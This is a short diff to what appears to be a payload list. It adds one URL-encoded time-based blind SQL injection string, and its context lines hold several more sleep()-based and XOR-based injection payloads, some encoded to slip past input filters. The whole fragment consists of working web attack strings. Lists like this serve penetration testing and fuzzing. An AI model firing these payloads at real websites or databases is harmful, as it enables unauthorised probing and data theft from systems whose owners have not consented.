@@ -96,7 +96,7 @@ latest:
 'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z#
 1%27/**/%256fR/**/50%2521%253D%253B%2523
 '+(select*from(select(sleep(20)))a)+'
-
+'%2b(select*from(select(sleep(20)))a)%2b'/
 
 '+(select*from(select(sleep(7)))a)+'
 'XOR(if(1=1,sleep(3),0))XOR'
